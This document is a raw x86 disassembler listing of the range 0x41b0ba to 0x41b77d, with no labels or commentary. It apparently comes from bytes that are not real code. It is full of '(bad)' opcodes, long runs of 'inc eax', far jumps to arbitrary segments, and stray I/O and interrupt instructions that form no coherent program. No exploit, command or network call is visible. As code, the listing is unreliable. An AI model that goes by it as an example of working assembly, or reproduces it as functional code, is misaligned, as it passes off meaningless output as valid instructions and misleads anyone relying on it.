  41b0ba:	add    eax,0x24ac623d
  41b0bf:	in     eax,dx
  41b0c0:	repnz inc eax
  41b0c2:	inc    eax
  41b0c3:	inc    eax
  41b0c4:	inc    eax
  41b0c5:	inc    eax
  41b0c6:	inc    eax
  41b0c7:	int3   
  41b0c8:	jne    0x41b10a
  41b0ca:	dec    ecx
  41b0cb:	retf   
  41b0cc:	scas   eax,DWORD PTR es:[edi]
  41b0cd:	addr16 push esi
  41b0cf:	jl     0x41b101
  41b0d1:	jmp    0x6181:0xcca8432f
  41b0d8:	addr16 in al,dx
  41b0da:	loope  0x41b153
  41b0dc:	mov    esi,0xc10040b8
  41b0e1:	inc    eax
  41b0e2:	inc    eax
  41b0e3:	inc    eax
  41b0e4:	inc    eax
  41b0e5:	add    BYTE PTR [eax-0x42],al
  41b0e8:	sbb    eax,0xa41eea41
  41b0ed:	sub    ah,BYTE PTR [edi-0x56]
  41b0f0:	mov    ds:0x6211ea43,al
  41b0f5:	adc    BYTE PTR ds:0xea4632d5,ch
  41b0fb:	(bad)  
  41b0fc:	les    esi,FWORD PTR [eax+0x40fb4118]
  41b102:	inc    eax
  41b103:	inc    eax
  41b104:	inc    eax
  41b105:	inc    eax
  41b106:	inc    eax
  41b107:	inc    eax
  41b108:	inc    eax
  41b109:	inc    DWORD PTR [eax+0x74]
  41b10c:	jmp    0x63ef:0x5a83a
  41b113:	inc    eax
  41b114:	jmp    0x4040:0x66cb6734
  41b11b:	inc    eax
  41b11c:	inc    eax
  41b11d:	inc    eax
  41b11e:	inc    eax
  41b11f:	inc    eax
  41b120:	inc    eax
  41b121:	inc    eax
  41b122:	inc    eax
  41b123:	inc    esp
  41b124:	pushf  
  41b125:	push   es
  41b126:	jmp    0x612c:0xbe46c022
  41b12d:	inc    eax
  41b12e:	jmp    0x4040:0x51b6265
  41b135:	inc    eax
  41b136:	inc    eax
  41b137:	inc    eax
  41b138:	inc    eax
  41b139:	inc    eax
  41b13a:	inc    eax
  41b13b:	add    BYTE PTR [eax-0x5a159c77],ch
  41b141:	nop
  41b142:	or     al,0x86
  41b144:	int    0xe4
  41b146:	and    al,ch
  41b148:	dec    esp
  41b149:	bound  esp,QWORD PTR [edx+0x57]
  41b14c:	dec    edx
  41b14d:	inc    eax
  41b14e:	inc    eax
  41b14f:	inc    eax
  41b150:	inc    eax
  41b151:	inc    eax
  41b152:	inc    eax
  41b153:	and    eax,0xf7404040
  41b158:	arpl   bx,sp
  41b15a:	(bad)  
  41b15b:	in     eax,dx
  41b15c:	inc    ecx
  41b15d:	daa    
  41b15e:	out    dx,al
  41b15f:	daa    
  41b160:	inc    eax
  41b161:	call   0x2e21483
  41b166:	inc    eax
  41b167:	inc    eax
  41b168:	inc    eax
  41b169:	inc    eax
  41b16a:	inc    eax
  41b16b:	inc    eax
  41b16c:	inc    eax
  41b16d:	inc    eax
  41b16e:	inc    eax
  41b16f:	inc    eax
  41b170:	inc    esp
  41b171:	or     esp,DWORD PTR [ebx+eiz*8]
  41b174:	sub    eax,0x2c08056c
  41b179:	and    DWORD PTR [ecx],eax
  41b17b:	call   0x64c85e28
  41b180:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b181:	pop    es
  41b182:	inc    eax
  41b183:	jecxz  0x41b1d5
  41b185:	rol    DWORD PTR [eax+0x63],0x56
  41b189:	mov    eax,ds:0xac2ae835
  41b18e:	inc    edx
  41b18f:	cld    
  41b190:	add    DWORD PTR [esi],0xcb3ae377
  41b196:	inc    eax
  41b197:	inc    eax
  41b198:	inc    eax
  41b199:	inc    eax
  41b19a:	inc    eax
  41b19b:	inc    eax
  41b19c:	rol    DWORD PTR [eax+0x40],0xf4
  41b1a0:	push   ebp
  41b1a1:	inc    esp
  41b1a2:	and    DWORD PTR [eax-0x18],eax
  41b1a5:	xor    al,0x15
  41b1a7:	jl     0x41b1dc
  41b1a9:	sub    al,0x50
  41b1ab:	xor    ah,bl
  41b1ad:	inc    esp
  41b1ae:	inc    ebx
  41b1af:	inc    eax
  41b1b0:	inc    eax
  41b1b1:	add    BYTE PTR [eax+0x40],al
  41b1b4:	inc    eax
  41b1b5:	inc    eax
  41b1b6:	inc    eax
  41b1b7:	inc    eax
  41b1b8:	push   edx
  41b1b9:	call   0xe8bf5d62
  41b1be:	inc    ebp
  41b1bf:	push   ds
  41b1c0:	jmp    0x41b14b
  41b1c2:	push   esi
  41b1c3:	jno    0x41b205
  41b1c5:	jecxz  0x41b1ff
  41b1c7:	ins    BYTE PTR es:[edi],dx
  41b1c8:	inc    eax
  41b1c9:	inc    eax
  41b1ca:	inc    eax
  41b1cb:	inc    eax
  41b1cc:	inc    eax
  41b1cd:	inc    eax
  41b1ce:	inc    eax
  41b1cf:	inc    eax
  41b1d0:	inc    eax
  41b1d1:	inc    eax
  41b1d2:	les    edi,FWORD PTR [esi]
  41b1d4:	and    ecx,0x6445e82b
  41b1da:	dec    esp
  41b1db:	in     eax,0x44
  41b1dd:	sbb    dl,ch
  41b1df:	jecxz  0x41b236
  41b1e1:	sbb    al,0x98
  41b1e3:	arpl   WORD PTR [eax+eax*2],bp
  41b1e6:	inc    eax
  41b1e7:	inc    eax
  41b1e8:	inc    eax
  41b1e9:	inc    eax
  41b1ea:	inc    eax
  41b1eb:	int3   
  41b1ec:	jne    0x41b22e
  41b1ee:	loope  0x41b230
  41b1f0:	call   0x9646d6a6
  41b1f5:	mov    ds:0x52e32371,al
  41b1fa:	inc    esp
  41b1fb:	xchg   DWORD PTR [ebp+ecx*8+0x21],ebp
  41b1ff:	jnp    0x41b26e
  41b201:	inc    eax
  41b202:	dec    ebx
  41b203:	inc    ecx
  41b204:	bound  ecx,QWORD PTR [ebx+0x3f]
  41b207:	inc    eax
  41b208:	add    cl,al
  41b20a:	inc    eax
  41b20b:	inc    eax
  41b20c:	inc    eax
  41b20d:	inc    eax
  41b20e:	add    BYTE PTR [eax+0x40],al
  41b211:	inc    edx
  41b212:	add    al,0x29
  41b214:	sbb    eax,0x2292fea9
  41b219:	scas   eax,DWORD PTR es:[edi]
  41b21a:	int    0xe1
  41b21c:	clc    
  41b21d:	inc    eax
  41b21e:	inc    eax
  41b21f:	inc    eax
  41b220:	inc    eax
  41b221:	inc    eax
  41b222:	inc    eax
  41b223:	inc    eax
  41b224:	inc    eax
  41b225:	inc    DWORD PTR [eax-0x50]
  41b228:	inc    esp
  41b229:	in     eax,0x59
  41b22b:	int    0x62
  41b22d:	mov    ebp,0x702c0262
  41b232:	inc    edi
  41b233:	sbb    al,BYTE PTR [eax+0x40404040]
  41b239:	inc    eax
  41b23a:	inc    eax
  41b23b:	inc    eax
  41b23c:	inc    eax
  41b23d:	inc    eax
  41b23e:	inc    eax
  41b23f:	dec    ecx
  41b240:	inc    edx
  41b241:	and    BYTE PTR [eax-0x23baa813],0xca
  41b248:	xor    al,0x73
  41b24a:	lds    eax,FWORD PTR [edx+0x40]
  41b24d:	lahf   
  41b24e:	test   DWORD PTR [ebp+edx*2+0x34],0x5b786141
  41b256:	daa    
  41b257:	nop
  41b258:	test   al,0x16
  41b25a:	into   
  41b25b:	push   esp
  41b25c:	push   edi
  41b25d:	or     DWORD PTR ds:0x33217cc5,0x40
  41b264:	inc    eax
  41b265:	inc    eax
  41b266:	inc    eax
  41b267:	inc    eax
  41b268:	inc    eax
  41b269:	inc    eax
  41b26a:	inc    eax
  41b26b:	add    cl,ah
  41b26d:	inc    eax
  41b26e:	dec    esp
  41b26f:	arpl   di,sp
  41b271:	repnz mov al,BYTE PTR [edi+eiz*2+0x6d]
  41b276:	into   
  41b277:	jg     0x41b2ad
  41b279:	bound  edx,QWORD PTR [eax-0x1ed7ddd3]
  41b27f:	enter  0xd242,0x16
  41b283:	sahf   
  41b284:	xor    bl,BYTE PTR [ecx+0x40]
  41b287:	inc    eax
  41b288:	inc    eax
  41b289:	inc    eax
  41b28a:	inc    eax
  41b28b:	inc    eax
  41b28c:	and    eax,0xf4404040
  41b291:	arpl   WORD PTR [edx+0x11d554d8],ax
  41b297:	inc    eax
  41b298:	dec    ebx
  41b299:	loope  0x41b253
  41b29b:	push   edx
  41b29c:	adc    eax,0xfe24a141
  41b2a1:	test   al,0xd
  41b2a3:	xor    eax,0x5beccede
  41b2a8:	ja     0x41b2ea
  41b2aa:	leave  
  41b2ab:	push   esi
  41b2ac:	inc    ebp
  41b2ad:	and    DWORD PTR [ebx+0x40404040],esp
  41b2b3:	inc    eax
  41b2b4:	inc    eax
  41b2b5:	inc    eax
  41b2b6:	inc    eax
  41b2b7:	inc    eax
  41b2b8:	inc    eax
  41b2b9:	inc    eax
  41b2ba:	push   0x1
  41b2bc:	mov    esi,0xbb44c0d1
  41b2c1:	aaa    
  41b2c2:	das    
  41b2c3:	fsubr  DWORD PTR [edi]
  41b2c5:	sub    al,0x67
  41b2c7:	sub    eax,0xb86b617f
  41b2cc:	retf   
  41b2cd:	push   esi
  41b2ce:	test   al,0x40
  41b2d0:	inc    eax
  41b2d1:	inc    eax
  41b2d2:	inc    eax
  41b2d3:	inc    eax
  41b2d4:	inc    eax
  41b2d5:	rol    DWORD PTR [eax+0x40],0x9c
  41b2d9:	mov    ds:0x4828d447,al
  41b2de:	rol    DWORD PTR ds:0x1d0530cd,1
  41b2e4:	inc    eax
  41b2e5:	xor    eax,0x474ecb6b
  41b2ea:	inc    ecx
  41b2eb:	sub    BYTE PTR [eax+0x40],al
  41b2ee:	add    BYTE PTR [eax+0x40],al
  41b2f1:	inc    eax
  41b2f2:	inc    eax
  41b2f3:	inc    eax
  41b2f4:	inc    eax
  41b2f5:	inc    eax
  41b2f6:	sub    BYTE PTR [eax+0x59a0d25e],0x5b
  41b2fd:	adc    al,BYTE PTR [eax-0x30]
  41b300:	xlat   BYTE PTR ds:[ebx]
  41b301:	and    al,BYTE PTR [eax+eax*2]
  41b304:	inc    edx
  41b305:	jns    0x41b347
  41b307:	retf   0x4040
  41b30a:	inc    eax
  41b30b:	inc    eax
  41b30c:	inc    eax
  41b30d:	inc    eax
  41b30e:	inc    eax
  41b30f:	inc    eax
  41b310:	inc    eax
  41b311:	inc    eax
  41b312:	outs   dx,BYTE PTR ds:[esi]
  41b313:	inc    esp
  41b314:	retf   
  41b315:	pop    ss
  41b316:	test   BYTE PTR [eax],ch
  41b318:	inc    esp
  41b319:	push   ebx
  41b31a:	lahf   
  41b31b:	sub    eax,0x49212f61
  41b320:	mov    ah,0x40
  41b322:	test   al,0x9a
  41b324:	xor    al,0x5d
  41b326:	or     dl,BYTE PTR [esi+0x3d]
  41b329:	inc    edx
  41b32a:	adc    al,ch
  41b32c:	xor    eax,DWORD PTR [eax-0x8]
  41b32f:	xor    al,0xc1
  41b331:	inc    eax
  41b332:	mov    eax,0xf36d1f4a
  41b337:	xor    al,BYTE PTR [eax+0x40]
  41b33a:	inc    eax
  41b33b:	inc    eax
  41b33c:	inc    eax
  41b33d:	inc    eax
  41b33e:	int3   
  41b33f:	jne    0x41b381
  41b341:	mov    ah,0x28
  41b343:	inc    edx
  41b344:	loop   0x41b2ed
  41b346:	imul   esp,DWORD PTR [esi],0x9100538
  41b34c:	inc    esp
  41b34d:	push   ecx
  41b34e:	inc    ecx
  41b34f:	cmp    dl,al
  41b351:	leave  
  41b352:	sub    ah,0x2c
  41b355:	loop   0x41b3b0
  41b357:	outs   dx,BYTE PTR ds:[esi]
  41b358:	sub    BYTE PTR [eax+0x406205],dl
  41b35e:	rol    DWORD PTR [eax+0x40],0x40
  41b362:	inc    eax
  41b363:	add    BYTE PTR [eax-0x68],al
  41b366:	out    dx,eax
  41b367:	inc    eax
  41b368:	arpl   WORD PTR [ebx-0x41],cx
  41b36b:	int    0x40
  41b36d:	inc    eax
  41b36e:	push   ecx
  41b36f:	xor    bl,BYTE PTR [ecx-0x57edf302]
  41b375:	int    0xff
  41b377:	or     eax,0x464d4c27
  41b37c:	sbb    al,0x69
  41b37e:	push   ecx
  41b37f:	inc    eax
  41b380:	jmp    DWORD PTR [eax-0x69ddc2f7]
  41b386:	jmp    FWORD PTR ds:0x40404040
  41b38c:	inc    eax
  41b38d:	inc    eax
  41b38e:	inc    eax
  41b38f:	inc    eax
  41b390:	inc    DWORD PTR [eax+0x14]
  41b393:	cmp    BYTE PTR [eax],dh
  41b395:	push   0x1a51cd65
  41b39a:	sahf   
  41b39b:	cmp    al,0x75
  41b39d:	bound  eax,QWORD PTR ds:0x1763ff53
  41b3a3:	inc    ecx
  41b3a4:	push   cs
  41b3a5:	inc    ecx
  41b3a6:	xchg   edx,esp
  41b3a8:	jle    0x41b3f0
  41b3aa:	imul   edi,esp,0xf948d49d
  41b3b0:	push   ss
  41b3b1:	jo     0x41b340
  41b3b3:	pop    ds
  41b3b4:	inc    eax
  41b3b5:	inc    eax
  41b3b6:	inc    eax
  41b3b7:	inc    eax
  41b3b8:	inc    eax
  41b3b9:	inc    eax
  41b3ba:	inc    eax
  41b3bb:	inc    eax
  41b3bc:	inc    eax
  41b3bd:	inc    eax
  41b3be:	ror    ch,cl
  41b3c0:	leave  
  41b3c1:	mov    edi,0xa89740bf
  41b3c6:	pop    edi
  41b3c7:	outs   dx,DWORD PTR ds:[esi]
  41b3c8:	mov    eax,0x46725fbf
  41b3cd:	adc    BYTE PTR [eax],bh
  41b3cf:	jecxz  0x41b3de
  41b3d1:	mov    esi,0x45d34062
  41b3d6:	adc    BYTE PTR [ebx+ecx*8-0x6c],dl
  41b3da:	outs   dx,BYTE PTR ds:[esi]
  41b3db:	jp     0x41b3d7
  41b3dd:	xlat   BYTE PTR ds:[ebx]
  41b3de:	mov    eax,0x4040407b
  41b3e3:	inc    eax
  41b3e4:	inc    eax
  41b3e5:	inc    eax
  41b3e6:	inc    eax
  41b3e7:	inc    eax
  41b3e8:	add    BYTE PTR [eax-0x3b],dl
  41b3eb:	push   edx
  41b3ec:	ins    DWORD PTR es:[edi],dx
  41b3ed:	nop
  41b3ee:	popf   
  41b3ef:	mov    gs,WORD PTR [eax+0x5]
  41b3f2:	inc    ebx
  41b3f3:	pusha  
  41b3f4:	inc    eax
  41b3f5:	jbe    0x41b3a2
  41b3f7:	inc    eax
  41b3f8:	inc    eax
  41b3f9:	inc    eax
  41b3fa:	inc    eax
  41b3fb:	inc    eax
  41b3fc:	inc    eax
  41b3fd:	and    eax,0x2e404040
  41b402:	(bad)  
  41b403:	retf   
  41b404:	push   ebx
  41b405:	lods   eax,DWORD PTR ds:[esi]
  41b406:	sub    BYTE PTR [ebp+0x54],al
  41b409:	or     bh,dl
  41b40b:	ret    0x2de0
  41b40e:	ret    0xca64
  41b411:	stos   DWORD PTR es:[edi],eax
  41b412:	sahf   
  41b413:	stos   DWORD PTR es:[edi],eax
  41b414:	clc    
  41b415:	dec    ebx
  41b416:	mov    ?,esp
  41b418:	and    BYTE PTR [eax+0x22bfa489],al
  41b41e:	inc    ecx
  41b41f:	jecxz  0x41b450
  41b421:	jae    0x41b486
  41b423:	inc    eax
  41b424:	inc    eax
  41b425:	inc    eax
  41b426:	inc    eax
  41b427:	inc    eax
  41b428:	inc    eax
  41b429:	inc    eax
  41b42a:	inc    eax
  41b42b:	inc    eax
  41b42c:	inc    eax
  41b42d:	adc    eax,0xe64a6ebf
  41b432:	jno    0x41b478
  41b434:	add    eax,0x404dbec9
  41b439:	adc    edx,edx
  41b43b:	inc    edx
  41b43c:	xchg   DWORD PTR [edx+edx*4+0x40],ecx
  41b440:	inc    eax
  41b441:	inc    eax
  41b442:	inc    eax
  41b443:	inc    eax
  41b444:	inc    eax
  41b445:	rol    DWORD PTR [eax+0x40],0xab
  41b449:	sub    bl,dh
  41b44b:	inc    edx
  41b44c:	inc    ecx
  41b44d:	inc    eax
  41b44e:	xor    eax,0xd34045d5
  41b453:	lock fsubr QWORD PTR [esi-0x49]
  41b457:	inc    ebx
  41b458:	mov    ds:0x4040706d,eax
  41b45d:	add    BYTE PTR [eax+0x40],al
  41b460:	inc    eax
  41b461:	inc    eax
  41b462:	inc    eax
  41b463:	inc    eax
  41b464:	mov    esp,0x53928f08
  41b469:	inc    edx
  41b46a:	push   0xffffff8a
  41b46c:	adc    BYTE PTR [eax+0x60e07362],ch
  41b472:	inc    eax
  41b473:	cli    
  41b474:	adc    DWORD PTR gs:[edx+eax*2+0x40],esi
  41b479:	inc    eax
  41b47a:	inc    eax
  41b47b:	inc    eax
  41b47c:	inc    eax
  41b47d:	inc    eax
  41b47e:	inc    eax
  41b47f:	inc    eax
  41b480:	inc    eax
  41b481:	inc    eax
  41b482:	cli    
  41b483:	xor    ebp,DWORD PTR [esi]
  41b485:	and    BYTE PTR [edx-0x66],0xfc
  41b489:	inc    eax
  41b48a:	mov    edi,0x5fcaf642
  41b48f:	bound  esp,QWORD PTR [ebp+0x41abbf6b]
  41b495:	std    
  41b496:	adc    BYTE PTR [eax-0x60],0xc
  41b49a:	mov    esi,0x52fd851d
  41b49f:	js     0x41b503
  41b4a1:	bound  eax,QWORD PTR [eax+0x40]
  41b4a4:	inc    eax
  41b4a5:	inc    eax
  41b4a6:	inc    eax
  41b4a7:	inc    eax
  41b4a8:	int3   
  41b4a9:	jne    0x41b4eb
  41b4ab:	nop
  41b4ac:	inc    esp
  41b4ad:	jle    0x41b461
  41b4af:	pop    ebp
  41b4b0:	lea    esi,[esi+0x5]
  41b4b3:	int    0xe0
  41b4b5:	inc    ecx
  41b4b6:	pop    esp
  41b4b7:	xor    al,0x62
  41b4b9:	test   bl,cl
  41b4bb:	inc    ebx
  41b4bc:	daa    
  41b4bd:	cli    
  41b4be:	jo     0x41b52b
  41b4c0:	popa   
  41b4c1:	bound  ecx,QWORD PTR [eax+0x53]
  41b4c4:	inc    edx
  41b4c5:	inc    eax
  41b4c6:	cmc    
  41b4c7:	xor    BYTE PTR ds:[edx+0x54],bh
  41b4cb:	loopne 0x41b4ee
  41b4cd:	inc    eax
  41b4ce:	add    cl,al
  41b4d0:	inc    eax
  41b4d1:	inc    eax
  41b4d2:	inc    eax
  41b4d3:	inc    eax
  41b4d4:	add    BYTE PTR [eax+0x30],al
  41b4d7:	mov    edi,0xc814e262
  41b4dc:	inc    esp
  41b4dd:	inc    edx
  41b4de:	inc    eax
  41b4df:	test   eax,0xbf654855
  41b4e4:	inc    eax
  41b4e5:	inc    eax
  41b4e6:	inc    eax
  41b4e7:	inc    eax
  41b4e8:	inc    eax
  41b4e9:	inc    eax
  41b4ea:	inc    eax
  41b4eb:	inc    eax
  41b4ec:	inc    DWORD PTR [eax+0x20]
  41b4ef:	loopne 0x41b564
  41b4f1:	pop    es
  41b4f2:	clc    
  41b4f3:	test   al,0x73
  41b4f5:	adc    eax,0xf2403400
  41b4fa:	arpl   WORD PTR [esi],di
  41b4fc:	in     al,0xca
  41b4fe:	(bad)
  41b501:	(bad)  
  41b502:	fmul   st,st(5)
  41b504:	add    BYTE PTR [eax+0x40],0x40
  41b508:	inc    eax
  41b509:	inc    eax
  41b50a:	inc    eax
  41b50b:	inc    eax
  41b50c:	inc    eax
  41b50d:	inc    eax
  41b50e:	inc    eax
  41b50f:	lods   al,BYTE PTR ds:[esi]
  41b510:	leave  
  41b511:	and    al,BYTE PTR [eax+0x3f]
  41b514:	jl     0x41b526
  41b516:	add    eax,0x802a2646
  41b51b:	sahf   
  41b51c:	xor    al,0xb8
  41b51e:	xchg   DWORD PTR [eax-0x80],edx
  41b521:	inc    eax
  41b522:	jp     0x41b51f
  41b524:	push   esi
  41b525:	add    eax,0xf473386d
  41b52a:	ficomp WORD PTR ds:[edx+0x404040cb]
  41b531:	inc    eax
  41b532:	inc    eax
  41b533:	inc    eax
  41b534:	inc    eax
  41b535:	inc    eax
  41b536:	add    BYTE PTR [edi+0x402fbfb8],bl
  41b53c:	test   DWORD PTR ds:0xbf0e6d42,eax
  41b542:	out    0x3a,al
  41b544:	jmp    0x1d7648a2
  41b549:	mov    edi,0x81fc6a22
  41b54e:	fsub   DWORD PTR [edx+0x62]
  41b551:	jle    0x41b585
  41b553:	inc    eax
  41b554:	out    dx,al
  41b555:	ret    
  41b556:	(bad)
  41b55a:	inc    eax
  41b55b:	inc    eax
  41b55c:	inc    eax
  41b55d:	inc    eax
  41b55e:	inc    eax
  41b55f:	and    eax,0xd5404040
  41b564:	xlat   BYTE PTR ds:[ebx]
  41b565:	xor    edx,DWORD PTR [ebx]
  41b567:	addr16 cwde 
  41b569:	jo     0x41b5dc
  41b56b:	dec    eax
  41b56c:	bound  ecx,QWORD PTR [edx]
  41b56e:	ja     0x41b56d
  41b570:	bound  esi,QWORD PTR [ecx+0x4b6e414c]
  41b576:	cwde   
  41b577:	inc    eax
  41b578:	add    BYTE PTR [edx-0x36],ah
  41b57b:	in     al,dx
  41b57c:	inc    eax
  41b57d:	sub    bh,BYTE PTR [ebx+0x4c]
  41b580:	bound  eax,QWORD PTR [esp+ebp*4+0x44]
  41b584:	popa   
  41b585:	inc    ecx
  41b586:	inc    eax
  41b587:	inc    eax
  41b588:	inc    eax
  41b589:	inc    eax
  41b58a:	inc    eax
  41b58b:	inc    eax
  41b58c:	inc    eax
  41b58d:	inc    eax
  41b58e:	inc    eax
  41b58f:	inc    eax
  41b590:	mov    al,0x67
  41b592:	xor    eax,0x452c3515
  41b597:	push   esi
  41b598:	add    BYTE PTR [edi+esi*2],cl
  41b59b:	cmp    eax,0x40207c43
  41b5a0:	lahf   
  41b5a1:	cmp    BYTE PTR [esi+ecx*4+0x176fcd6d],dl
  41b5a8:	dec    ebx
  41b5a9:	inc    esp
  41b5aa:	dec    esp
  41b5ab:	jge    0x41b595
  41b5ad:	inc    edi
  41b5ae:	push   ss
  41b5af:	xor    ah,BYTE PTR [esi]
  41b5b1:	mov    ch,cl
  41b5b3:	inc    eax
  41b5b4:	inc    eax
  41b5b5:	inc    eax
  41b5b6:	inc    eax
  41b5b7:	inc    eax
  41b5b8:	inc    eax
  41b5b9:	rol    DWORD PTR [eax+0x40],0x15
  41b5bd:	(bad)  
  41b5be:	out    dx,al
  41b5bf:	jle    0x41b601
  41b5c1:	cdq    
  41b5c2:	addr16 popf 
  41b5c4:	ds inc edx
  41b5c6:	inc    esp
  41b5c7:	and    BYTE PTR [ecx],al
  41b5c9:	xchg   esi,eax
  41b5ca:	int3   
  41b5cb:	je     0x41b598
  41b5cd:	retf   
  41b5ce:	sub    al,0x7a
  41b5d0:	int3   
  41b5d1:	sbb    cl,BYTE PTR [esi]
  41b5d3:	or     BYTE PTR [edi+0x40517a04],ah
  41b5d9:	pushf  
  41b5da:	inc    eax
  41b5db:	inc    eax
  41b5dc:	add    BYTE PTR [eax+0x40],al
  41b5df:	inc    eax
  41b5e0:	inc    eax
  41b5e1:	inc    eax
  41b5e2:	inc    eax
  41b5e3:	inc    ecx
  41b5e4:	leave  
  41b5e5:	in     eax,dx
  41b5e6:	fcmovb st,st(5)
  41b5e8:	mov    al,ds:0x4868ee39
  41b5ed:	jo     0x41b651
  41b5ef:	inc    ecx
  41b5f0:	xor    al,0x40
  41b5f2:	xchg   ecx,eax
  41b5f3:	inc    ecx
  41b5f4:	or     eax,0x48ce7020
  41b5f9:	sub    al,0x2a
  41b5fb:	leave  
  41b5fc:	inc    edx
  41b5fd:	fs and al,0x24
  41b600:	and    ah,cl
  41b602:	or     al,BYTE PTR [eax+0x40]
  41b605:	inc    eax
  41b606:	inc    eax
  41b607:	inc    eax
  41b608:	inc    eax
  41b609:	inc    eax
  41b60a:	inc    eax
  41b60b:	inc    eax
  41b60c:	inc    eax
  41b60d:	dec    eax
  41b60e:	inc    ecx
  41b60f:	test   al,0xbf
  41b611:	inc    esp
  41b612:	sub    BYTE PTR [eax+0x7e],al
  41b615:	add    bh,BYTE PTR [ecx*1+0x510d2d15]
  41b61c:	cs retf 
  41b61e:	mov    bl,cl
  41b620:	enter  0xad78,0x2d
  41b624:	aaa    
  41b625:	mov    esp,0x404040a8
  41b62a:	inc    eax
  41b62b:	inc    eax
  41b62c:	inc    eax
  41b62d:	int3   
  41b62e:	jne    0x41b670
  41b630:	mov    ds:0xcc4dd548,eax
  41b635:	fwait
  41b636:	adc    eax,0x41545bac
  41b63b:	popa   
  41b63c:	inc    eax
  41b63d:	or     DWORD PTR [ebx+ecx*8+0x52],eax
  41b641:	retf   0xebce
  41b644:	es sub esp,ecx
  41b647:	adc    eax,0x686eb4c4
  41b64c:	les    eax,FWORD PTR [edi]
  41b64e:	sbb    BYTE PTR [edx+0x4f],al
  41b651:	inc    eax
  41b652:	add    cl,al
  41b654:	inc    eax
  41b655:	inc    eax
  41b656:	inc    eax
  41b657:	inc    eax
  41b658:	add    BYTE PTR [eax+0xd],al
  41b65b:	inc    esp
  41b65c:	and    DWORD PTR [ecx+0xd],eax
  41b65f:	bound  eax,QWORD PTR [ebx+ebx*1-0x35]
  41b663:	sub    eax,0x42900c4f
  41b668:	les    ebx,FWORD PTR [edx+0x42]
  41b66b:	jbe    0x41b60e
  41b66d:	inc    eax
  41b66e:	and    cl,cl
  41b670:	je     0x41b6c4
  41b672:	inc    eax
  41b673:	inc    eax
  41b674:	inc    eax
  41b675:	inc    eax
  41b676:	inc    eax
  41b677:	inc    eax
  41b678:	inc    eax
  41b679:	inc    eax
  41b67a:	inc    DWORD PTR [eax+0x47]
  41b67d:	int    0xed
  41b67f:	das    
  41b680:	push   esi
  41b681:	mov    eax,0x4165a800
  41b686:	and    BYTE PTR [edi+esi*4+0x5],bl
  41b68a:	sahf   
  41b68b:	pop    ss
  41b68c:	inc    eax
  41b68d:	inc    eax
  41b68e:	inc    eax
  41b68f:	inc    eax
  41b690:	inc    eax
  41b691:	inc    eax
  41b692:	inc    eax
  41b693:	inc    eax
  41b694:	inc    eax
  41b695:	inc    eax
  41b696:	in     al,dx
  41b697:	into   
  41b698:	das    
  41b699:	inc    eax
  41b69a:	out    0xcb,eax
  41b69c:	and    DWORD PTR cs:[ebx+0x72],0x4c276075
  41b6a4:	cwde   
  41b6a5:	or     DWORD PTR [edi+0x661ae244],edi
  41b6ab:	inc    ebx
  41b6ac:	test   al,0x55
  41b6ae:	add    eax,0x4040402d
  41b6b3:	inc    eax
  41b6b4:	inc    eax
  41b6b5:	inc    eax
  41b6b6:	inc    eax
  41b6b7:	inc    eax
  41b6b8:	add    BYTE PTR [ebp+0x40],ch
  41b6bb:	and    DWORD PTR [eax+eax*2-0x58],esp
  41b6bf:	xchg   BYTE PTR [esi+eiz*2+0x7b],dh
  41b6c3:	jns    0x41b6d9
  41b6c5:	jle    0x41b70c
  41b6c7:	lods   al,BYTE PTR ds:[esi]
  41b6c8:	lds    esp,FWORD PTR [edx]
  41b6ca:	adc    al,0x43
  41b6cc:	push   esi
  41b6cd:	inc    eax
  41b6ce:	inc    eax
  41b6cf:	inc    eax
  41b6d0:	inc    eax
  41b6d1:	inc    eax
  41b6d2:	inc    eax
  41b6d3:	and    eax,0x6b404040
  41b6d8:	sub    dl,BYTE PTR ds:0xf3401441
  41b6de:	mov    esi,0xcec93570
  41b6e3:	stos   BYTE PTR es:[edi],al
  41b6e4:	xor    BYTE PTR es:[ecx+eax*2+0x4073b118],0x40
  41b6ed:	push   cs
  41b6ee:	dec    ecx
  41b6ef:	fstp   QWORD PTR [ebx+0x25e044b7]
  41b6f5:	inc    esp
  41b6f6:	test   al,0x77
  41b6f8:	xchg   edx,eax
  41b6f9:	inc    ebp
  41b6fa:	sub    eax,0x4040082c
  41b6ff:	inc    eax
  41b700:	inc    eax
  41b701:	inc    eax
  41b702:	inc    eax
  41b703:	inc    eax
  41b704:	inc    eax
  41b705:	inc    eax
  41b706:	inc    eax
  41b707:	ret    
  41b708:	adc    al,bl
  41b70a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b70b:	inc    esp
  41b70c:	jb     0x41b75b
  41b70e:	inc    eax
  41b70f:	adc    al,0xb8
  41b711:	gs inc edi
  41b713:	sub    ch,dl
  41b715:	in     eax,0x7a
  41b717:	xchg   edi,eax
  41b718:	inc    ebx
  41b719:	inc    eax
  41b71a:	inc    eax
  41b71b:	inc    eax
  41b71c:	inc    eax
  41b71d:	inc    eax
  41b71e:	inc    eax
  41b71f:	rol    DWORD PTR [eax+0x40],0x40
  41b723:	jns    0x41b71e
  41b725:	inc    edx
  41b726:	shl    BYTE PTR [edx+0x4d],0x87
  41b72a:	inc    eax
  41b72b:	fcom   QWORD PTR [edx-0x6dbf1a22]
  41b731:	cmp    BYTE PTR [eax+0x63],al
  41b734:	jae    0x41b762
  41b736:	imul   ebp,DWORD PTR [esi],0xffffffae
  41b739:	adc    DWORD PTR [eax+0x6],ebx
  41b73c:	add    BYTE PTR [eax+0x40],0x0
  41b740:	inc    eax
  41b741:	inc    eax
  41b742:	inc    eax
  41b743:	inc    eax
  41b744:	inc    eax
  41b745:	inc    eax
  41b746:	inc    esp
  41b747:	and    DWORD PTR [eax-0x20],eax
  41b74a:	inc    ebx
  41b74b:	loope  0x41b6f6
  41b74d:	inc    ebx
  41b74e:	sub    eax,0x404a2756
  41b753:	and    al,0x40
  41b755:	inc    eax
  41b756:	inc    eax
  41b757:	inc    eax
  41b758:	inc    eax
  41b759:	inc    eax
  41b75a:	inc    eax
  41b75b:	inc    eax
  41b75c:	inc    eax
  41b75d:	inc    eax
  41b75e:	xor    al,0xac
  41b760:	jo     0x41b705
  41b762:	inc    eax
  41b763:	mov    ds:0x1532ac02,al
  41b768:	inc    eax
  41b769:	dec    esp
  41b76a:	sub    DWORD PTR [eax],edi
  41b76c:	push   eax
  41b76d:	retf   
  41b76e:	arpl   WORD PTR [ebx-0x33],ax
  41b771:	jecxz  0x41b7b3
  41b773:	push   esi
  41b774:	int3   
  41b775:	adc    eax,0x40694126
  41b77a:	sub    al,0x2c
  41b77c:	push   ebp
  41b77d:	inc    esi
